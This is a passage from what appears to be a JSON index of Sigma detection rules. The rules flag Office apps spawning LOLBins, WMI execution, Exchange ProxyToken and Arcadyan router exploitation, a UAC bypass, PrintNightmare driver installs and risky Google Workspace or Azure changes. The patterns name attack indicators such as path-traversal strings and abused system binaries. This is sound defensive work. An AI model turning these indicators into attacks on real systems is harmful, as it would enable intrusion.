\u0026#39;\\WebServiceCache\\AllUsers\u0026#39; TargetFilename|endswith: \u0026#39;.com\u0026#39; filter_webex: Image|endswith: \u0026#39;winword.exe\u0026#39; TargetFilename|contains: \u0026#39;\\AppData\\Local\\Temp\\webexdelta\\\u0026#39; TargetFilename|endswith: - \u0026#39;.dll\u0026#39; - \u0026#39;.exe\u0026#39; filter_localassembly: TargetFilename|contains: \u0026#39;\\AppData\\Local\\assembly\\tmp\\\u0026#39; TargetFilename|endswith: \u0026#39;.dll\u0026#39; condition: selection1 and selection2 and not 1 of filter_* falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_script_creation_by_office_using_file_ext.yml/","tags":["attack.t1204.002","attack.t1047","attack.t1218.010","attack.execution","attack.defense_evasion"],"title":"Created Files by Office Applications"},{"categories":null,"contents":"Initial execution of malicious document calls wmic Win32_Process::Create to execute the file with regsvr32\nKnown false-positives Unknown References https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml Raw rule (edit) title: EDR WMI Command Execution by Office Applications id: 3ee1bba8-b9e2-4e35-bec5-7fb66b6b3815 description: Initial execution of malicious document calls wmic Win32_Process::Create to execute the file with regsvr32 references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml author: \u0026#39;Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\u0026#39; tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 modified: 2021/11/09 logsource: product: windows category: edr detection: #useful_information: Add more office applications to the rule logic of choice selection1: EventLog: EDR EventType: WMIExecution WMIcommand|contains: \u0026#39;Win32_Process\\:\\:Create\u0026#39; selection2: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; condition: selection1 and selection2 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/edr/windows/edr_command_execution_by_office_applications.yml/","tags":["attack.t1204.002","attack.t1047","attack.t1218.010","attack.execution","attack.defense_evasion"],"title":"EDR WMI Command Execution by Office Applications"},{"categories":null,"contents":"This rule will monitor LOLBin process creations by wmiprvse. Add more LOLBins to rule logic if needed.\nKnown false-positives Unknown References https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml Raw rule (edit) title: Lolbins Process Creation with WmiPrvse id: 8a582fe2-0882-4b89-a82a-da6b2dc32937 description: This rule will monitor LOLBin process creations by wmiprvse. Add more LOLBins to rule logic if needed. references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml author: \u0026#39;Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\u0026#39; tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 logsource: product: windows category: process_creation detection: #useful_information: add more LOLBins to the rules logic of your choice. selection1: Image|endswith: - \u0026#39;regsvr32\u0026#39; - \u0026#39;rundll32\u0026#39; - \u0026#39;msiexec\u0026#39; - \u0026#39;mshta\u0026#39; - \u0026#39;verclsid\u0026#39; selection2: ParentImage|endswith: \\wbem\\WmiPrvSE.exe condition: selection1 and selection2 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbins_with_wmiprvse_parent_process.yml/","tags":["attack.t1204.002","attack.t1047","attack.t1218.010","attack.execution","attack.defense_evasion"],"title":"Lolbins Process Creation with WmiPrvse"},{"categories":null,"contents":"This rule will monitor any office apps that spins up a new LOLBin process. This activity is pretty suspicious and should be investigated.\nKnown false-positives Unknown References https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml Raw rule (edit) title: New Lolbin Process by Office Applications id: 23daeb52-e6eb-493c-8607-c4f0246cb7d8 description: This rule will monitor any office apps that spins up a new LOLBin process. This activity is pretty suspicious and should be investigated. references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml author: \u0026#39;Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\u0026#39; tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 logsource: product: windows category: process_creation detection: #useful_information: add more LOLBins to the rules logic of your choice. selection1: Image|endswith: - \u0026#39;regsvr32\u0026#39; - \u0026#39;rundll32\u0026#39; - \u0026#39;msiexec\u0026#39; - \u0026#39;mshta\u0026#39; - \u0026#39;verclsid\u0026#39; selection2: ParentImage|endswith: - winword.exe - excel.exe - powerpnt.exe condition: selection1 and selection2 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbins_by_office_applications.yml/","tags":["attack.t1204.002","attack.t1047","attack.t1218.010","attack.execution","attack.defense_evasion"],"title":"New Lolbin Process by Office Applications"},{"categories":null,"contents":"Detects the exploitation of Microsoft Exchange ProxyToken vulnerability as described in CVE-2021-33766\nKnown false-positives Unknown References https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server Raw rule (edit) title: CVE-2021-33766 Exchange ProxyToken Exploitation id: 56973b50-3382-4b56-bdf5-f51a3183797a status: experimental description: Detects the exploitation of Microsoft Exchange ProxyToken vulnerability as described in CVE-2021-33766 author: Florian Roth, Max Altgelt, Christian Burkard date: 2021/08/30 references: - https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: cs-method: \u0026#39;POST\u0026#39; c-uri|contains|all: - \u0026#39;/ecp/\u0026#39; - \u0026#39;/RulesEditor/InboxRules.svc/NewObject\u0026#39; sc-status: 500 selection2: c-uri|contains|all: - \u0026#39;SecurityToken=\u0026#39; - \u0026#39;/ecp/\u0026#39; sc-status: 500 condition: selection1 or selection2 fields: - c-ip - c-dns falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_33766_msexchange_proxytoken.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2021-33766 Exchange ProxyToken Exploitation"},{"categories":null,"contents":"Detects indicators of a UAC bypass method by mocking directories\nKnown false-positives Unknown References https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows https://github.com/netero1010/TrustedPath-UACBypass-BOF Raw rule (edit) title: TrustedPath UAC Bypass Pattern id: 4ac47ed3-44c2-4b1f-9d51-bf46e8914126 status: test description: Detects indicators of a UAC bypass method by mocking directories references: - https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e - https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows - https://github.com/netero1010/TrustedPath-UACBypass-BOF author: Florian Roth date: 2021/08/27 tags: - attack.defense_evasion - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: Image|contains: \u0026#39;C:\\Windows \\System32\\\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_uac_bypass_trustedpath.yml/","tags":["attack.defense_evasion","attack.t1548.002"],"title":"TrustedPath UAC Bypass Pattern"},{"categories":null,"contents":"Detects when an an application is removed from Google Workspace.\nKnown false-positives Application being removed may be performed by a System Administrator. References https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings?hl=en#REMOVE_APPLICATION https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings?hl=en#REMOVE_APPLICATION_FROM_WHITELIST Raw rule (edit) title: Google Workspace Application Removed id: ee2803f0-71c8-4831-b48b-a1fc57601ee4 description: Detects when an an application is removed from Google Workspace. author: Austin Songer status: experimental date: 2021/08/26 references: - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings?hl=en#REMOVE_APPLICATION - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings?hl=en#REMOVE_APPLICATION_FROM_WHITELIST logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: - REMOVE_APPLICATION - REMOVE_APPLICATION_FROM_WHITELIST condition: selection level: medium tags: - attack.impact falsepositives: - Application being removed may be performed by a System Administrator. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gworkspace/gworkspace_application_removed.yml/","tags":["attack.impact"],"title":"Google Workspace Application Removed"},{"categories":null,"contents":"Detects when multi-factor authentication (MFA) is disabled.\nKnown false-positives MFA may be disabled and performed by a system administrator. References https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-security-settings#ENFORCE_STRONG_AUTHENTICATION https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-security-settings?hl=en#ALLOW_STRONG_AUTHENTICATION Raw rule (edit) title: Google Workspace MFA Disabled id: 780601d1-6376-4f2a-884e-b8d45599f78c description: Detects when multi-factor authentication (MFA) is disabled. author: Austin Songer status: experimental date: 2021/08/26 modified: 2021/12/02 references: - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-security-settings#ENFORCE_STRONG_AUTHENTICATION - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-security-settings?hl=en#ALLOW_STRONG_AUTHENTICATION logsource: product: google_workspace service: google_workspace.admin detection: selection_base: eventService: admin.googleapis.com eventName: - ENFORCE_STRONG_AUTHENTICATION - ALLOW_STRONG_AUTHENTICATION selection_eventValue: new_value: \u0026#39;false\u0026#39; condition: all of selection* level: medium tags: - attack.impact falsepositives: - MFA may be disabled and performed by a system administrator. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gworkspace/gworkspace_mfa_disabled.yml/","tags":["attack.impact"],"title":"Google Workspace MFA Disabled"},{"categories":null,"contents":"This detection uses AzureActivity logs (Administrative category) to identify the creation or update of a server instance in an Azure AD Hybrid health AD FS service. A threat actor can create a new AD Health ADFS service and create a fake server instance to spoof AD FS signing logs. There is no need to compromise an on-prem AD FS server. This can be done programmatically via HTTP requests to Azure.\nKnown false-positives legitimate AD FS servers added to an AAD Health AD FS service instance References https://o365blog.com/post/hybridhealthagent/ Raw rule (edit) title: Azure Active Directory Hybrid Health AD FS New Server id: 288a39fc-4914-4831-9ada-270e9dc12cb4 description: | This detection uses AzureActivity logs (Administrative category) to identify the creation or update of a server instance in an Azure AD Hybrid health AD FS service. A threat actor can create a new AD Health ADFS service and create a fake server instance to spoof AD FS signing logs. There is no need to compromise an on-prem AD FS server. This can be done programmatically via HTTP requests to Azure. status: experimental date: 2021/08/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.defense_evasion - attack.t1578 references: - https://o365blog.com/post/hybridhealthagent/ logsource: product: azure service: AzureActivity detection: selection: CategoryValue: \u0026#39;Administrative\u0026#39; ResourceProviderValue: \u0026#39;Microsoft.ADHybridHealthService\u0026#39; ResourceId|contains: \u0026#39;AdFederationService\u0026#39; OperationNameValue: \u0026#39;Microsoft.ADHybridHealthService/services/servicemembers/action\u0026#39; condition: selection falsepositives: - legitimate AD FS servers added to an AAD Health AD FS service instance level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_aadhybridhealth_adfs_new_server.yml/","tags":["attack.defense_evasion","attack.t1578"],"title":"Azure Active Directory Hybrid Health AD FS New Server"},{"categories":null,"contents":"This detection uses AzureActivity logs (Administrative category) to identify the deletion of an Azure AD Hybrid health AD FS service instance in a tenant. A threat actor can create a new AD Health ADFS service and create a fake server to spoof AD FS signing logs. The health AD FS service can then be deleted after it is not longer needed via HTTP requests to Azure.\nKnown false-positives legitimate AAD Health AD FS service instances being deleted in a tenant References https://o365blog.com/post/hybridhealthagent/ Raw rule (edit) title: Azure Active Directory Hybrid Health AD FS Service Delete id: 48739819-8230-4ee3-a8ea-e0289d1fb0ff description: | This detection uses AzureActivity logs (Administrative category) to identify the deletion of an Azure AD Hybrid health AD FS service instance in a tenant. A threat actor can create a new AD Health ADFS service and create a fake server to spoof AD FS signing logs. The health AD FS service can then be deleted after it is not longer needed via HTTP requests to Azure. status: experimental date: 2021/08/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.defense_evasion - attack.t1578.003 references: - https://o365blog.com/post/hybridhealthagent/ logsource: product: azure service: AzureActivity detection: selection: CategoryValue: \u0026#39;Administrative\u0026#39; ResourceProviderValue: \u0026#39;Microsoft.ADHybridHealthService\u0026#39; ResourceId|contains: \u0026#39;AdFederationService\u0026#39; OperationNameValue: \u0026#39;Microsoft.ADHybridHealthService/services/delete\u0026#39; condition: selection falsepositives: - legitimate AAD Health AD FS service instances being deleted in a tenant level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_aadhybridhealth_adfs_service_delete.yml/","tags":["attack.defense_evasion","attack.t1578.003"],"title":"Azure Active Directory Hybrid Health AD FS Service Delete"},{"categories":null,"contents":"This detection uses Windows security events to detect suspicious access attempts to the registry key of Azure AD Health monitoring agent. This detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object HKLM\\SOFTWARE\\Microsoft\\Microsoft Online\\Reporting\\MonitoringAgent.\nKnown false-positives Unknown References https://o365blog.com/post/hybridhealthagent/ https://github.com/OTRF/Set-AuditRule/blob/master/rules/registry/aad_connect_health_monitoring_agent.yml Raw rule (edit) title: Azure AD Health Monitoring Agent Registry Keys Access id: ff151c33-45fa-475d-af4f-c2f93571f4fe description: | This detection uses Windows security events to detect suspicious access attempts to the registry key of Azure AD Health monitoring agent. This detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object HKLM\\SOFTWARE\\Microsoft\\Microsoft Online\\Reporting\\MonitoringAgent. status: experimental date: 2021/08/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.discovery - attack.t1012 references: - https://o365blog.com/post/hybridhealthagent/ - https://github.com/OTRF/Set-AuditRule/blob/master/rules/registry/aad_connect_health_monitoring_agent.yml logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 ObjectType: \u0026#39;Key\u0026#39; ObjectName: \u0026#39;\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Microsoft Online\\Reporting\\MonitoringAgent\u0026#39; filter: ProcessName|contains: - \u0026#39;Microsoft.Identity.Health.Adfs.DiagnosticsAgent.exe\u0026#39; - \u0026#39;Microsoft.Identity.Health.Adfs.InsightsService.exe\u0026#39; - \u0026#39;Microsoft.Identity.Health.Adfs.MonitoringAgent.Startup.exe\u0026#39; - \u0026#39;Microsoft.Identity.Health.Adfs.PshSurrogate.exe\u0026#39; - \u0026#39;Microsoft.Identity.Health.Common.Clients.ResourceMonitor.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_aadhealth_mon_agent_regkey_access.yml/","tags":["attack.discovery","attack.t1012"],"title":"Azure AD Health Monitoring Agent Registry Keys Access"},{"categories":null,"contents":"This detection uses Windows security events to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g AD FS). Information from AD Health service agents can be used to potentially abuse some of the features provided by those services in the cloud (e.g. Federation). This detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object: HKLM:\\SOFTWARE\\Microsoft\\ADHealthAgent. Make sure you set the SACL to propagate to its sub-keys.\nKnown false-positives Unknown References https://o365blog.com/post/hybridhealthagent/ https://github.com/OTRF/Set-AuditRule/blob/master/rules/registry/aad_connect_health_service_agent.yml Raw rule (edit) title: Azure AD Health Service Agents Registry Keys Access id: 1d2ab8ac-1a01-423b-9c39-001510eae8e8 description: | This detection uses Windows security events to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g AD FS). Information from AD Health service agents can be used to potentially abuse some of the features provided by those services in the cloud (e.g. Federation). This detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object: HKLM:\\SOFTWARE\\Microsoft\\ADHealthAgent. Make sure you set the SACL to propagate to its sub-keys. status: experimental date: 2021/08/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.discovery - attack.t1012 references: - https://o365blog.com/post/hybridhealthagent/ - https://github.com/OTRF/Set-AuditRule/blob/master/rules/registry/aad_connect_health_service_agent.yml logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 ObjectType: \u0026#39;Key\u0026#39; ObjectName: \u0026#39;\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\ADHealthAgent\u0026#39; filter: ProcessName|contains: - \u0026#39;Microsoft.Identity.Health.Adfs.DiagnosticsAgent.exe\u0026#39; - \u0026#39;Microsoft.Identity.Health.Adfs.InsightsService.exe\u0026#39; - \u0026#39;Microsoft.Identity.Health.Adfs.MonitoringAgent.Startup.exe\u0026#39; - \u0026#39;Microsoft.Identity.Health.Adfs.PshSurrogate.exe\u0026#39; - \u0026#39;Microsoft.Identity.Health.Common.Clients.ResourceMonitor.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_aadhealth_svc_agent_regkey_access.yml/","tags":["attack.discovery","attack.t1012"],"title":"Azure AD Health Service Agents Registry Keys Access"},{"categories":null,"contents":"Detects exploitation of vulnerabilities in Arcadyan routers as reported in CVE-2021-20090 and CVE-2021-20091.\nKnown false-positives Unknown References https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2 https://www.tenable.com/security/research/tra-2021-13 https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild Raw rule (edit) title: Arcadyan Router Exploitations id: f0500377-bc70-425d-ac8c-e956cd906871 status: experimental description: Detects exploitation of vulnerabilities in Arcadyan routers as reported in CVE-2021-20090 and CVE-2021-20091. references: - https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2 - https://www.tenable.com/security/research/tra-2021-13 - https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild author: Bhabesh Raj date: 2021/08/24 modified: 2021/08/25 falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 - cve.2021.20090 - cve.2021.20091 logsource: category: webserver detection: path_traversal: c-uri|contains: # CVE-2021-20090 (Bypass Auth: Path Traversal) - \u0026#39;..%2f\u0026#39; config_file_inj: c-uri|contains|all: # Chaining of CVE-2021-20090 (Bypass Auth) and CVE-2021-20091 (Config File Injection) - \u0026#39;..%2f\u0026#39; - \u0026#39;apply_abstract.cgi\u0026#39; noauth_list: c-uri|contains: - \u0026#39;/images/\u0026#39; - \u0026#39;/js/\u0026#39; - \u0026#39;/css/\u0026#39; - \u0026#39;/setup_top_login.htm\u0026#39; - \u0026#39;/login.html\u0026#39; - \u0026#39;/loginerror.html\u0026#39; - \u0026#39;/loginexclude.html\u0026#39; - \u0026#39;/loginlock.html\u0026#39; condition: (path_traversal or config_file_inj) and noauth_list ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_arcadyan_router_cve_2021_20090_2021_20091_exploit.yml/","tags":["attack.initial_access","attack.t1190","cve.2021.20090","cve.2021.20091"],"title":"Arcadyan Router Exploitations"},{"categories":null,"contents":"Detects the remote installation of a print driver which is possible indication of the exploitation of PrintNightmare (CVE-2021-1675). The occurrence of print drivers being installed remotely via RPC functions should be rare, as print drivers are normally installed locally and or through group policy.\nKnown false-positives Legitimate remote alteration of a printer driver. References https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/93d1915d-4d9f-4ceb-90a7-e8f2a59adc29 https://github.com/zeek/zeek/blob/master/scripts/base/protocols/dce-rpc/consts.zeek https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527 https://github.com/corelight/CVE-2021-1675 https://github.com/SigmaHQ/sigma/blob/master/rules/network/zeek/zeek_dce_rpc_mitre_bzar_persistence.yml https://old.zeek.org/zeekweek2019/slides/bzar.pdf https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/ Raw rule (edit) title: Possible PrintNightmare Print Driver Install id: 7b33baef-2a75-4ca3-9da4-34f9a15382d8 description: | Detects the remote installation of a print driver which is possible indication of the exploitation of PrintNightmare (CVE-2021-1675). The occurrence of print drivers being installed remotely via RPC functions should be rare, as print drivers are normally installed locally and or through group policy. author: \u0026#39;@neu5ron (Nate Guagenti)\u0026#39; date: 2021/08/23 references: - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/93d1915d-4d9f-4ceb-90a7-e8f2a59adc29 - https://github.com/zeek/zeek/blob/master/scripts/base/protocols/dce-rpc/consts.zeek - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527 - https://github.com/corelight/CVE-2021-1675 - https://github.com/SigmaHQ/sigma/blob/master/rules/network/zeek/zeek_dce_rpc_mitre_bzar_persistence.yml - https://old.zeek.org/zeekweek2019/slides/bzar.pdf - https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/ tags: - attack.execution - cve.2021.1678 - cve.2021.1675 - cve.2021.34527 logsource: product: zeek service: dce_rpc detection: printer_operation: operation: - \u0026#39;RpcAsyncInstallPrinterDriverFromPackage\u0026#39; # \u0026#34;76f03f96-cdfd-44fc-a22c-64950a001209\u0026#34;,0x3e - \u0026#39;RpcAsyncAddPrintProcessor\u0026#39; # \u0026#34;76f03f96-cdfd-44fc-a22c-64950a001209\u0026#34;,0x2c - \u0026#39;RpcAddPrintProcessor\u0026#39; # \u0026#34;12345678-1234-abcd-ef00-0123456789ab\u0026#34;,0x0e - \u0026#39;RpcAddPrinterDriverEx\u0026#39; # \u0026#34;12345678-1234-abcd-ef00-0123456789ab\u0026#34;,0x59 - \u0026#39;RpcAddPrinterDriver\u0026#39; # \u0026#34;12345678-1234-abcd-ef00-0123456789ab\u0026#34;,0x09 - \u0026#39;RpcAsyncAddPrinterDriver\u0026#39; # \u0026#34;76f03f96-cdfd-44fc-a22c-64950a001209\u0026#34;,0x27 condition: printer_operation falsepositives: - Legitimate remote alteration of a printer driver. level: medium fields: - id.orig_h - id.resp_h - id.resp_p - operation - endpoint - named_pipe - uid status: stable ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dce_rpc_printnightmare_print_driver_install.yml/","tags":["attack.execution","cve.2021.1678","cve.2021.1675","cve.2021.34527"],"title":"Possible PrintNightmare Print Driver Install"},{"categories":null,"contents":"Detects when an API access service account is granted domain authority.\nKnown false-positives Unknown References https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings#AUTHORIZE_API_CLIENT_ACCESS Raw rule (edit) title: Google Workspace Granted Domain API Access id: 04e2a23a-9b29-4a5c-be3a-3542e3f982ba description: Detects when an API access service account is granted domain authority. author: Austin Songer status: experimental date: 2021/08/23 references: - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings#AUTHORIZE_API_CLIENT_ACCESS logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: AUTHORIZE_API_CLIENT_ACCESS condition: selection level: medium tags: - attack.persistence - attack.t1098 falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gworkspace/gworkspace_granted_domain_api_access.yml/","tags":["attack.persistence","attack.t1098"],"title":"Google Workspace Granted Domain API Access"},{"categories":null,"contents":"Detects when an a role is modified or deleted in Google Workspace.\nKnown false-positives Unknown References https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-delegated-admin-settings Raw rule (edit) title: Google Workspace Role Modified or Deleted id: 6aef64e3-60c6-4782-8db3-8448759c714e description: Detects when an a role is modified or deleted in Google Workspace. author: Austin Songer status: experimental date: 2021/08/24 references: - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-delegated-admin-settings logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: - DELETE_ROLE - RENAME_ROLE - UPDATE_ROLE condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gworkspace/gworkspace_role_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Google Workspace Role Modified or Deleted"},{"categories":null,"contents":"Detects when an a role privilege is deleted in Google Workspace.\nKnown false-positives Unknown References https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-delegated-admin-settings Raw rule (edit) title: Google Workspace Role Privilege Deleted id: bf638ef7-4d2d-44bb-a1dc-a238252e6267 description: Detects when an a role privilege is deleted in Google Workspace. author: Austin Songer status: experimental date: 2021/08/24 references: - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-delegated-admin-settings logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: REMOVE_PRIVILEGE condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gworkspace/gworkspace_role_privilege_deleted.yml/","tags":["attack.impact"],"title":"Google Workspace Role Privilege Deleted"},{"categories":null,"contents":"Detects when an Google Workspace user is granted admin privileges.\nKnown false-positives Google Workspace admin role privileges, may be modified by system administrators. References https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-user-settings#GRANT_ADMIN_PRIVILEGE Raw rule (edit) title: Google Workspace User Granted Admin Privileges id: 2d1b83e4-17c6-4896-a37b-29140b40a788 description: Detects when an Google Workspace user is granted admin privileges. author: Austin Songer status: experimental date: 2021/08/23 references: - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3 - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-user-settings#GRANT_ADMIN_PRIVILEGE logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: - GRANT_DELEGATED_ADMIN_PRIVILEGES - GRANT_ADMIN_PRIVILEGE condition: selection level: medium tags: - attack.persistence - attack.t1098 falsepositives: - Google Workspace admin role privileges, may be modified by system administrators. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gworkspace/gworkspace_user_granted_admin_privileges.yml/","tags":["attack.persistence","attack.t1098"],"title":"Google Workspace User Granted Admin Privileges"},{"categories":null,"contents":"Detects a explorer.exe sub process of the RazerInstaller software which can be invoked from the installer to select a different installation folder but can also be exploited to escalate privileges to LOCAL SYSTEM\nKnown false-positives User selecting a different installation folder (check for other sub processes of this explorer.exe process) References https://twitter.com/j0nh4t/status/1429049506021138437 https://streamable.com/q2dsji Raw rule (edit) title: Suspicious RazerInstaller Explorer Subprocess id: a4eaf250-7dc1-4842-862a-5e71cd59a167 status: experimental description: Detects a explorer.exe sub process of the RazerInstaller software which can be invoked from the installer to select a different installation folder but can also be exploited to escalate privileges to LOCAL SYSTEM references: - https://twitter.com/j0nh4t/status/1429049506021138437 - https://streamable.com/q2dsji author: Florian Roth, Maxime Thiebaut date: 2021/08/23 modified: 2021/08/24 tags: - attack.privilege_escalation - attack.t1553 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\RazerInstaller.exe\u0026#39; IntegrityLevel: \u0026#39;System\u0026#39; filter: Image|startswith: \u0026#39;C:\\Windows\\Installer\\Razer\\Installer\\\u0026#39; condition: selection and not filter falsepositives: - User selecting a different installation folder (check for other sub processes of this explorer.exe process) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_razorinstaller_explorer.yml/","tags":["attack.privilege_escalation","attack.t1553"],"title":"Suspicious RazerInstaller Explorer Subprocess"},{"categories":null,"contents":"Detects usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack 